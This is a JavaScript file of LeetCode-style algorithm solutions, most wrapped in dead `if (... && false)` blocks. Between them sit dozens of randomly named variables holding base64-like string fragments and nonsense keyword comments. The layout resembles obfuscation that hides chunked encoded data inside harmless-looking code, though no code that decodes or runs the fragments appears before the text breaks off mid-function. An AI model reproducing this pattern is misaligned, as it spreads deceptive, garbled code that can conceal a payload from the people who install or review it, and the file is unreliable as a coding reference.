 Given a binary tree where all the right nodes are either leaf nodes with a sibling (a left node that shares the same parent node) or empty, flip it upside down and turn it into a tree where the original right nodes turned into left leaf nodes. Return the new root.
For example:
Given a binary tree {1,2,3,4,5},

    1
   / \
  2   3
 / \
4   5

return the root of the binary tree [4,5,2,#,#,3,1].

   4
  / \
 5   2
    / \
   3   1  

confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {TreeNode}
 */
var upsideDownBinaryTree = function(root) {
    if (!root || (!root.left && !root.right)) {
        return root;
    }
    
    let newRoot = upsideDownBinaryTree(root.left);
    
    root.left.left = root.right;
    root.left.right = root;
    
    root.left = null;
    root.right = null;
    
    return newRoot;
};

}

    var utsqliefw = 'uUUa';
if (0.99 && false) {
    /**
Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______3______
       /              \
    ___5__          ___1__
   /      \        /      \
   6      _2       0       8
         /  \
         7   4
For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (!root || root === p || root === q) {
        return root;
    }
    
    var left = lowestCommonAncestor(root.left, p, q),
        right = lowestCommonAncestor(root.right, p, q);
    
    // q and p in different side    
    if (left && right) {
        return root;
    }
    
    return left ? left : right;
};

}

    var zloealrbqnez = 'UhKbGR';
    var jetptvbkiox = 'YwyAj';
if (0.62 && false) {
    /**
Given two binary strings, return their sum (also a binary string).

For example,
a = "11"
b = "1"
Return "100".
*/

/**
 * @param {string} a
 * @param {string} b
 * @return {string}
 */
var addBinary = function(a, b) {
    var lenA = a.length,
        lenB = b.length,
        overFlow = 0,
        charA,
        charB,
        result = '',
        curVal,
        i,
        j;

    for (i = lenA - 1, j = lenB - 1; i >= 0 && j >= 0; i--, j --) {
        charA = parseInt(a.charAt(i));
        charB = parseInt(b.charAt(j));

        curVal = charA + charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;
    }

    while (i >= 0) {
        charA = parseInt(a.charAt(i));
        curVal = charA + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        result = curVal + result;

        i--;
    }

    while (j >= 0) {
        charB = parseInt(b.charAt(j));
        curVal = charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;

        j--;
    }

    if (overFlow === 1) {
        result = '1' + result;
    }
    
    return result;
};

}

    var tzjmuzuxxd = 'IVnliaUJ5W';
if (Array.isArray(4)) {
    /**
Given a linked list, determine if it has a cycle in it.

Follow up:
Can you solve it without using extra space?

 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {boolean}
 */
var hasCycle = function(head) {
    var slow = head,
        fast = head;
    
    while(fast !== null && fast.next !== null) {
        slow = slow.next;
        fast = fast.next.next;
        if (slow === fast || (fast && fast.next === slow)) {
            return true;
        }
    }
    return false;
};

}

    var dhyngatzcln = 'KYpbbHt';
    var vdcbzsssxezio = 'lhOMGNtb';
    var bgbboajp = 'HOkb';
    var retwnfwiy = 'GpkR1Zr';
    var iolqowgpygzx = 'WmaAKmZNYg';
if ('r' === 'O') {
    /**
Write an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties:

Integers in each row are sorted in ascending from left to right.
Integers in each column are sorted in ascending from top to bottom.
For example,

Consider the following matrix:

[
  [1,   4,  7, 11, 15],
  [2,   5,  8, 12, 19],
  [3,   6,  9, 16, 22],
  [10, 13, 14, 17, 24],
  [18, 21, 23, 26, 30]
]
Given target = 5, return true.

Given target = 20, return false.
*/
/**
 * @param {number[][]} matrix
 * @param {number} target
 * @return {boolean}
 */
var searchMatrix = function(matrix, target) {
    var rowLen = matrix.length,
        columnLen,
        value,
        i,
        j;
        
    if (rowLen === 0) {
        return false;
    }
    
    columnLen = matrix[0].length;
    
    if (columnLen === 0) {
        return false;
    }
    
    i = 0;
    j = columnLen - 1;
    
    while (i < rowLen && j >= 0) {
        value = matrix[i][j];
        
        if (target > value) {
            i++;
        } else if (target < value) {
            j--;
        } else {
            return true;
        }
    }
    
    return false;
};

// Time limit exceeded...
/**
 * @param {number[][]} matrix
 * @param {number} target
 * @return {boolean}
 */
var searchMatrix = function(matrix, target) {
    var rowLen = matrix.length,
        columnLen,
        i,
        j;
        
    if (rowLen === 0) {
        return false;
    }
    
    columnLen = matrix[0].length;
    
    if (columnLen === 0) {
        return false;
    }
    
    return helper(0, rowLen - 1, 0, columnLen - 1, target, matrix);
};

function helper(rowStart, rowEnd, colStart, colEnd, target, matrix) {
    if (rowStart > rowEnd || colStart > colEnd) {
        return false;
    }
    
    var rowMid = Math.floor((rowStart + rowEnd) / 2),
        colMid = Math.floor((colStart + colEnd) / 2),
        value = matrix[rowMid][colMid];
    
    if (value < target) {
        return helper(rowStart, rowEnd, colMid + 1, colEnd, target, matrix) || helper(rowMid + 1, rowEnd, colStart, colMid, target, matrix) || helper(rowMid + 1, rowEnd, colMid + 1, colEnd, target, matrix);
    } else if (value > target) {
        return helper(rowStart, rowEnd - 1, colMid, colEnd, target, matrix) || helper(rowMid, rowEnd, colStart, colMid - 1, target, matrix) || helper(rowStart, rowMid - 1, colStart, colMid - 1, target, matrix);
    }
    
    return true;
}

}

    var qnttftjh = 'UzJWNWN';
if (3 instanceof String) {
    /**
Write a function that takes an unsigned integer and returns the number of ’1' bits it has (also known as the Hamming weight).

For example, the 32-bit integer ’11' has binary representation 00000000000000000000000000001011, so the function should return 3.

 * @param {number} n - a positive integer
 * @return {number}
 */
var hammingWeight = function(n) {
    var result = 0;
    while (n > 0) {
        //compare last digit
        //bitwise AND compare
        if ((n & 1) === 1) {
            result ++;
        }
        n >>>= 1;
    }
    return result;
};

}

    var jhwcbf = 'KlTlWPxdlG';
    var dfrdhwncrcml = '5NXpi';
    var xmblnbuuzaku = 'EImSP';
    var mgocoal = 'MjFs';
    var dvfbcpnw = 'vTGNHWXWFV';
    var zxvan = 'S0d0b';
    var jebqkwubfmai = 'TahJxsGTG';
    var upeaicrohgk = 'GVTQTlQa';
    var qofthvdqe = 'UwJXsrwU';
    var xpvck = 'UFLSUNBZ0';
if (0.49 && false) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times). However, you may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        cur,
        prev,
        temp = 0
        max = 0;
    
    if (length === 0 || length === 1) {
        return max;
    }
    low = prices[0];
    high = prices[0];
    prev = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > prev) {
            high = cur;
            temp = high - low;
        } else if (cur < prev) {
            max += temp;
            temp = 0;
            low = cur;
            high = cur;
        }
        prev = cur;
    }
    if (temp !== 0) {
        max += temp;
    }
    return max;
};

}

    var taapub = 'RPKS';
    var jxvvkwkgtxrpzvl = 'lDQWdJQ0';
if ('false' === true) {
    /**
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].

Follow up: What if you are given k 1d vectors? How well can your code be extended to such cases?

Clarification for the follow up question - Update (2015-09-18):
The "Zigzag" order is not clearly defined and is ambiguous for k > 2 cases. If "Zigzag" does not look right to you, replace "Zigzag" with "Cyclic". For example, given the following input:

[1,2,3]
[4,5,6,7]
[8,9]

It should return [1,4,8,2,5,9,3,6,7]. 
*/
/**
 * @constructor
 * @param {Integer[]} v1
 * @param {Integer[]} v1
 */
var ZigzagIterator = function ZigzagIterator(v1, v2) {
    this.arr = arguments;
    this.list = [];
    
    for (let i = 0; i < this.arr.length; i++) {
        if (this.arr[i].length > 0) {
            this.list.push([i, 0]);
        }
    }
    
};


/**
 * @this ZigzagIterator
 * @returns {boolean}
 */
ZigzagIterator.prototype.hasNext = function hasNext() {
    return this.list.length > 0;
};

/**
 * @this ZigzagIterator
 * @returns {integer}
 */
ZigzagIterator.prototype.next = function next() {
    const targetIndex = this.list.shift();
    const val = this.arr[targetIndex[0]][targetIndex[1]];
    
    if (targetIndex[1] < this.arr[targetIndex[0]].length - 1) {
        this.list.push([targetIndex[0], targetIndex[1] + 1]);
    }
    
    return val;
};

/**
 * Your ZigzagIterator will be called like this:
 * var i = new ZigzagIterator(v1, v2), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var gswfzdaxw = 'FgPiu';
    var fibdbtdalwcvz = 'FvSVd0bGVT';
    var daajvymizplf = 'yQLhZSmACm';
    var vpbgmpapzraeg = 'NWpkSEpzS';
if (0.74 && false) {
    /**
Implement regular expression matching with support for '.' and '*'.

'.' Matches any single character.
'*' Matches zero or more of the preceding element.

The matching should cover the entire input string (not partial).

The function prototype should be:
bool isMatch(const char *s, const char *p)

Some examples:
isMatch("aa","a") → false
isMatch("aa","aa") → true
isMatch("aaa","aa") → false
isMatch("aa", "a*") → true
isMatch("aa", ".*") → true
isMatch("ab", ".*") → true
isMatch("aab", "c*a*b") → true
*/
/**
 * @param {string} s
 * @param {string} p
 * @return {boolean}
 * 
 * The most critical observation is that "x*" can either match empty string, or at least one x. In the latter case, it is equivalent to "xx*" or "x*x"
 * 
 *  
        'match' below including .
    f(i,j) means s where s.len=i matches p where p.len=j
    f(i,j) =
        if (p_j-1 != * ) f(i-1, j-1) and s_i-1 matches p_j-1
        if (p_j-1 == * )
            * matches zero times: f(i,j-2)
            or * matches at least one time: f(i-1,j) and s_i-1 matches p_j-2
 */
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        f = [],
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(0) === '*') {
        return false;
    }
    
    for (i = 0; i <= lenS; i++) {
        f.push(new Array(lenP + 1));
        for (j = 0; j <= lenP; j++) {
            f[i][j] = false;
        }
    }
    
    f[0][0] = true;
    
    for (i = 1; i < lenP; i++) {
        if (p.charAt(i) === '*') {
            f[0][i + 1] = f[0][i - 1];
        }
    }
    
    for (i = 1; i <= lenS; i++) {
        for (j = 1; j <= lenP; j++) {
            if (p.charAt(j - 1) === '*') {
                f[i][j] = f[i][j - 2] || (f[i - 1][j] && (s.charAt(i - 1) === p.charAt(j - 2) || p.charAt(j - 2) === '.'));
            } else {
                f[i][j] = f[i - 1][j - 1] && (s.charAt(i - 1) === p.charAt(j - 1) || p.charAt(j - 1) === '.');
            }
        }
    }
    
    return f[lenS][lenP];
};


// TIME LIMIT EXCEEDED
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(1) === '*') {
        return isMatch(s, p.substr(2)) || s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p);
    } else {
        return s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p.substr(1));
    }

};

}

    var zcdfsmkj = 'oZVO';
    var mbiui = 'Uh4OElHVjJ';
if ('false' === true) {
    /**
Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______3______
       /              \
    ___5__          ___1__
   /      \        /      \
   6      _2       0       8
         /  \
         7   4
For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (!root || root === p || root === q) {
        return root;
    }
    
    var left = lowestCommonAncestor(root.left, p, q),
        right = lowestCommonAncestor(root.right, p, q);
    
    // q and p in different side    
    if (left && right) {
        return root;
    }
    
    return left ? left : right;
};

}

    var rbufyoubtjn = 'FuYEuWDn';
if (!true && 1) {
    /**
Given an array of integers, find out whether there are two distinct indices i and j in the array such that the difference between nums[i] and nums[j] is at most t and the difference between i and j is at most k.
*/

/**
The idea is like the bucket sort algorithm. Suppose we have consecutive buckets covering the range of nums with each bucket a width of (t+1). If there are two item with difference <= t, one of the two will happen:

(1) the two in the same bucket
(2) the two in neighbor buckets

*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @param {number} t
 * @return {boolean}
 */
var containsNearbyAlmostDuplicate = function(nums, k, t) {
    var len = nums.length,
        map = {},
        id,
        i;
    
    if (t < 0) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        id = getBucketId(nums[i], t + 1);
        
        if (map.hasOwnProperty(id)) {
            return true;
        } 
        
        if (map.hasOwnProperty(id - 1) && Math.abs(map[id - 1] - nums[i]) <= t) {
            return true;
        }
        
        if (map.hasOwnProperty(id + 1) && Math.abs(map[id + 1] - nums[i]) <= t) {
            return true;
        }
        
        map[id] = nums[i];
        
        if (i >= k) {
            delete map[getBucketId(nums[i - k], t + 1)];
        }
    }
    
    return false;
};

function getBucketId(num, bucketLength) {
    return Math.floor(num / bucketLength);
}

}

    var ugmbymdc = 'aVzUwTG1OM';
    var axrhok = 'QKGNTqkzI';
if (0.10 && false) {
    /**
Given a binary tree, return the zigzag level order traversal of its nodes' values. (ie, from left to right, then right to left for the next level and alternate between).

For example:
Given binary tree {3,9,20,#,#,15,7},
    3
   / \
  9  20
    /  \
   15   7
return its zigzag level order traversal as:
[
  [3],
  [20,9],
  [15,7]
]
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var zigzagLevelOrder = function(root) {
    var result = [],
        cur = [],
        left = true,
        i,
        len,
        temp,
        next;
    
    if (!root) {
        return result;
    }
    
    cur.push(root);
    
    while(cur.length > 0) {
        len = cur.length;
        temp = [];
        next = [];
        
        for (i = 0; i < len; i++) {
            temp.push(cur[i].val);
            
            if (cur[i].left) {
                next.push(cur[i].left);
            }
            
            if (cur[i].right) {
                next.push(cur[i].right);
            }
        }
        
        if (!left) {
            temp.reverse();
        }
        
        left = !left;
        result.push(temp);
        cur = next;
    }

    return result;
};

// SOLUTION 2: USE STACK
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var zigzagLevelOrder = function(root) {
    var result = [],
        cur = [],
        left = true,
        i,
        len,
        temp,
        next,
        node;
    
    if (!root) {
        return result;
    }
    
    cur.push(root);
    
    while(cur.length > 0) {
        len = cur.length;
        temp = [];
        next = [];
        
        node = cur.pop();
        
        while (node) {
            temp.push(node.val);
            
            if (left) {
                if (node.left) {
                    next.push(node.left);
                }
                
                if (node.right) {
                    next.push(node.right);
                }
            } else {
                if (node.right) {
                    next.push(node.right);
                }
                
                if (node.left) {
                    next.push(node.left);
                }
            }
            
            node = cur.pop();
        }
        
        result.push(temp);
        cur = next;
        left = !left;
    }
    
    return result;
};
}

    var lczyilcp = 'GNt';
    var qvkluhacfnkk = 'nNPa';
    var qelsqwqtsxzbxis = 'eEx';
    var ewedbtgyvew = 'SwPV';
// hello number compile aokv script array compile lptoyas biqmw string world number define array
    var kmvlvq = 'toHOcVSg';
    var gbwcw = 'aWGtwS';
if (4 instanceof String) {
    /**
Follow up for "Remove Duplicates":
What if duplicates are allowed at most twice?

For example,
Given sorted array nums = [1,1,1,2,2,3],

Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. It doesn't matter what you leave beyond the new length.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var removeDuplicates = function(nums) {
    var duplicate = false,
        len = nums.length,
        index = 1,
        i;
    
    for (i = 1; i < len; i++) {
        if (duplicate && nums[i] === nums[i - 1]) {
            continue;
        }
        
        if (nums[i] === nums[i - 1]) {
            duplicate = true;
        } else {
            duplicate = false;
        }
        
        nums[index] = nums[i];
        index++;
    }
    
    return index;
};

}

    var ksxymmd = 'avOSrSIcMa';
    var wdmfd = 'UNZbU';
    var erfrqy = 'rJSbLxRw';
if (0.20 && false) {
    /**
Given a binary tree, return all root-to-leaf paths.

For example, given the following binary tree:

   1
 /   \
2     3
 \
  5
All root-to-leaf paths are:

["1->2->5", "1->3"]
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {string[]}
 */
var binaryTreePaths = function(root) {
    var result = [];
    
    getPaths(root, null, result);
    
    return result;
};

function getPaths(node, curStr, result) {
    if (node === null) {
        return;
    }
    
    if (!curStr) {
        curStr = '' + node.val;
    } else {
        curStr += '->' + node.val;
    }
    
    if (node.left) {
        getPaths(node.left, curStr, result);
    }
    
    if (node.right) {
        getPaths(node.right, curStr, result);
    }
    
    if (!node.left && !node.right) {
        result.push(curStr);
    }
}

}

    var wajxwnptj = 'NpQWdJQ';
    var lfnesyvirycw = 'nOAT';
if ('c' === 'O') {
    
/**
 * Given an array of integers, every element appears twice except for one. Find that single one.
 * Note:
 * Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
 * 
 * @param {number[]} A
 * @return {number}
 */
var singleNumber = function(A) {
    var length = A.length,
        i,
        result = 0;
    if (length === 1) {
        return A[0];
    }
    for (i = 0; i < length; i++) {
        result = result ^ A[i];
    }
    return result;
};

}

    var mfuiw = '0FnSUN';
    var pnfduwlcrvk = 'XzapkYxJXA';
    var swfik = 'BZ0tDRnJ';
    var ujefld = 'rWpZcBuRCs';
// import define script object number string world array
if (4 === 12) {
    /**
Count the number of prime numbers less than a non-negative number, n

 * @param {number} n
 * @return {number}
 */
var countPrimes = function(n) {
    var i,
        j,
        result = 0,
        prime;
    if (n === 1) {
        return 0;
    }
    for (i = 2; i < n; i++) {
        prime = true;
        for (j = 2; j*j <= i; j++) {
            if (i%j === 0) {
                prime = false;
                break;
            }
        }
        if (prime) {
            result++;
        }
    }
    return result;
};

}

    var vterxiaygev = 'DxKQkJW';
    var gxfnpri = 'aWGt1YzJo';
    var vdivlo = 'bMNBd';
// value define export number debug rgjp return compile export compile script omggfypj
    var adtbtrxauyuh = 'zdmnsTJ';
if ('false' === true) {
    /**
A strobogrammatic number is a number that looks the same when rotated 180 degrees (looked at upside down).

Find all strobogrammatic numbers that are of length = n.

For example,
Given n = 2, return ["11","69","88","96"].

Hint:
Try to use recursion and notice that it should recurse with n - 2 instead of n - 1.
*/
/**
 * @param {number} n
 * @return {string[]}
 */
var findStrobogrammatic = function(n) {
    return helper(n, n);
};

function helper(cur, n) {
    if (cur === 0) {
        return [''];
    }
    
    if (cur === 1) {
        return ['1', '8', '0'];
    }
    
    const list = helper(cur - 2, n);
    let result = [];
    
    for (let i = 0; i < list.length; i++) {
        if (cur !== n) {
            result.push('0' + list[i] + '0');
        }
        
        result.push('1' + list[i] + '1');
        result.push('8' + list[i] + '8');
        result.push('6' + list[i] + '9');
        result.push('9' + list[i] + '6');
    }
    
    return result;
}

}

    var qudtqx = 'cFpuUWdm';
if (41 > 135) {
    /**
You are given an n x n 2D matrix representing an image.

Rotate the image by 90 degrees (clockwise).

Follow up:
Could you do this in-place?
*/

/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var rotate = function(matrix) {
    var len = matrix.length,
        i,
        level,
        tmp;
    
    level = 0;
    
    while (level < len/2) {
        for (i = level; i < len - level - 1; i++) {
           tmp = matrix[level][i];
           matrix[level][i] = matrix[len - i - 1][level];
           matrix[len - i - 1][level] = matrix[len - 1 - level][len - 1 - i];
           matrix[len - 1 - level][len - 1 - i] = matrix[i][len - 1 - level];
           matrix[i][len - 1 - level] = tmp;
        }
        level++;
    }
};

}

    var erudpmngph = 'YlbAD';
    var nltmutt = 'SHdn';
    var hwpyia = 'zZOmLp';
if (typeof navigator === 'undefined') {
    /**
Given an array with n objects colored red, white or blue, sort them so that objects of the same color are adjacent, with the colors in the order red, white and blue.

Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively.

Note:
You are not suppose to use the library's sort function for this problem.

click to show follow up.

Follow up:
A rather straight forward solution is a two-pass algorithm using counting sort.
First, iterate the array counting number of 0's, 1's, and 2's, then overwrite array with total number of 0's, then 1's and followed by 2's.

Could you come up with an one-pass algorithm using only constant space?

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var sortColors = function(nums) {
    var len = nums.length,
        redEnds = 0,
        blueStarts = len - 1,
        i;
    
    function swap(m, n, arr) {
        var temp = arr[m];
        
        arr[m] = arr[n];
        arr[n] = temp;
    }

    for (i = 0; i <= blueStarts;) {
        if (nums[i] === 0) {
            swap(i, redEnds, nums);
            i++;
            redEnds++;
        } else if (nums[i] === 2) {
            swap(i, blueStarts, nums);
            blueStarts--;
        } else {
            i++;
        }
    }
};

}

    var uuyto = 'Wlh';
    var ineqkjp = 'FGZPoL';
    var tntlk = 'abGJuUXV';
if (0.32 && false) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var maxPathSum = function(root) {
    var max = [];
    
    max[0] = Number.NEGATIVE_INFINITY;
    getMaxValueToParent(root, max);
    
    return max[0];
};

/**
* This function returns the max value that contains current node to its parent
*/
function getMaxValueToParent(root, max) {
    if (root === null) {
        return 0;
    }
    
    var left = getMaxValueToParent(root.left, max),
        right = getMaxValueToParent(root.right, max),
        maxPathAcrossRootNotToParent = root.val + left + right, // path that contains current node and will not go to its parent
        maxPathAcrossRootToParent = Math.max(root.val, root.val + Math.max(left, right));
        
    max[0] = Math.max(max[0], maxPathAcrossRootNotToParent, maxPathAcrossRootToParent);
    
    return maxPathAcrossRootToParent;
}

}

    var sdykxiqjunt = 'lCIu';
    var joltamnlqhgz = 'jMmhwWm5S';
    var hcecgkhgnbe = 'kFTMrlmFt';
    var zodkgptafzoh = 'TFpYa3';
    var eqmvicy = 'jMhdcVDGLw';
if (65 > 144) {
    /**
Given a string s and a dictionary of words dict, determine if s can be segmented into a space-separated sequence of one or more dictionary words.

For example, given
s = "leetcode",
dict = ["leet", "code"].

Return true because "leetcode" can be segmented as "leet code".
*/
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {boolean}
 */
var wordBreak = function(s, wordDict) {
    var hasFound = [],
        len = s.length,
        i,
        j;
    
    hasFound[0] = true;
    
    for (i = 1; i <= len; i++) {
        for (j = 0; j < i; j++) {
            if (hasFound[j] && wordDict.has(s.substring(j, i))) {
                hasFound[i] = true;
                break;
            }
        }
    }
    
    return hasFound[len] === true;
};

}

    var hctgqhsoqg = 'BJQ1';
if (typeof document === 'undefined') {
    /**
Given an unsorted array, find the maximum difference between the successive elements in its sorted form.

Try to solve it in linear time/space.

Return 0 if the array contains less than 2 elements.

You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var maximumGap = function(nums) {
    var length = nums.length,
        bucket = [],
        max = Number.MIN_VALUE,
        min = Number.MAX_VALUE,
        gap = 0,
        bLen,
        bIndex,
        prev,
        i;
        
    if (length < 2) {
        return 0;
    }
    
    for (i = 0; i < length; i++) {
        if (nums[i] > max) {
            max = nums[i];
        }
        
        if (nums[i] < min) {
            min = nums[i];
        } 
    }
    
    // length of each bucket
    bLen = Math.floor((max - min) / length) + 1;
    
    for (i = 0; i < length; i++) {
        bIndex = Math.floor((nums[i] - min) / bLen);
        
        if (!bucket[bIndex]) {
            bucket[bIndex] = [];
            bucket[bIndex].push(nums[i]);
            bucket[bIndex].push(nums[i]);
        } else {
            if (nums[i] < bucket[bIndex][0]) {
                bucket[bIndex][0] = nums[i];
            } else if (nums[i] > bucket[bIndex][1]) {
                bucket[bIndex][1] = nums[i];
            }
        }
    }
    
    length = bucket.length;
    prev = 0;
    
    for (i = 1; i < length; i++) {
        if (!bucket[i]) {
            continue;
        }
        
        gap = Math.max(gap, bucket[i][0] - bucket[prev][1]);
        prev = i;
    }
    
    return gap;
};

}

    var ljgmlcll = 'cWzR';
    var bszqufrnvqsatmu = 'ltQ';
    var bxdvtxhoryk = 'QgSVnPr';
// script function string code async string variable event compile
    var qicwguyai = 'TJJSsVp';
if (typeof navigator === 'undefined') {
    /**
Given two binary trees, write a function to check if they are equal or not.

Two binary trees are considered equal if they are structurally identical and the nodes have the same value.

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @returns {boolean}
 */
var isSameTree = function(p, q) {
    if (!p && !q) {
        return true;
    }
    if (!p || !q) {
        return false;
    }
    if (p.val !== q.val) {
        return false;
    }
    return isSameTree(p.left, q.left)&&isSameTree(p.right, q.right);
};

}

    var kcraqawxbseswkj = '2lBZ0lD';
if (10 === 19) {
    /**
Given an array nums, write a function to move all 0's to the end of it while maintaining the relative order of the non-zero elements.

For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].

Note:
You must do this in-place without making a copy of the array.
Minimize the total number of operations.
*/

/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var moveZeroes = function(nums) {
    var len = nums.length,
        curIndex = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === 0) {
            continue;
        }
        
        nums[curIndex] = nums[i];
        curIndex++;
    }
    
    for (i = curIndex; i < len; i++) {
        nums[i] = 0;
    }
};

}

    var ohurapskjuvj = 'TipUi';
    var rkyarz = 'QWdJQ0FnS';
    var unqaotzv = 'XtaL';
    var dykbeqq = '0NGclpYa3V';
    var hnfrzkwa = 'JrVwSH';
    var vbyxthnn = 'iV1Y';
    var mnhcgobjkg = 'YGmU';
    var ysvusybkgyuqguk = 'wWVNC';
if (typeof document === 'undefined') {
    /**
Given an integer matrix, find the length of the longest increasing path.

From each cell, you can either move to four directions: left, right, up or down. You may NOT move diagonally or move outside of the boundary (i.e. wrap-around is not allowed).

Example 1:

nums = [
  [9,9,4],
  [6,6,8],
  [2,1,1]
]
Return 4
The longest increasing path is [1, 2, 6, 9].

Example 2:

nums = [
  [3,4,5],
  [3,2,6],
  [2,2,1]
]
Return 4
The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed.
*/
/**
 * @param {number[][]} matrix
 * @return {number}
 */
var longestIncreasingPath = function(matrix) {
    var dp = [], // dp[i][j] the longest increasing path starting from matrix[i][j]
        rLen = matrix.length,
        cLen,
        i,
        j,
        max = 0;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            max = Math.max(max, dfs(i, j, rLen, cLen, matrix, dp));
        }
    }
    
    return max;
};

function dfs(i, j, rLen, cLen, matrix, dp) {
    if (dp[i][j] !== 0) {
        return dp[i][j];
    }
    
    var dx = [1, 0, 0, -1],
        dy = [0, 1, -1, 0],
        max = 1,
        m,
        len,
        x,
        y;
        
    for (m = 0; m < 4; m++) {
        x = dx[m] + i;
        y = dy[m] + j;
        
        if (x >= 0 && y >= 0 && x < rLen && y < cLen && matrix[x][y] > matrix[i][j]) {
            max = Math.max(max, 1 + dfs(x, y, rLen, cLen, matrix, dp));
        }
    }
    
    dp[i][j] = max;
    
    return max;
}

}

    var mftxcjya = 'QBNvZu';
    var plfhvttj = 'OGZDQmx';
    var swcrxpslzki = 'XxxsUKGVcZ';
    var lzkanxvdgk = 'kbV';
    var rwpnknabn = 'eUrbxhbnew';
    var wwcxv = 'Z1ZEM';
    var zceclqocfer = 'YyQuVXlj';
if (0.80 && false) {
    /**
Find the contiguous subarray within an array (containing at least one number) which has the largest product.

For example, given the array [2,3,-2,4],
the contiguous subarray [2,3] has the largest product = 6.
*/

/**
 * @param {number[]} nums
 * @return {number}
 * 
 * max_product[i] = max(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 * min_product[i] = min(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 */
var maxProduct = function(nums) {
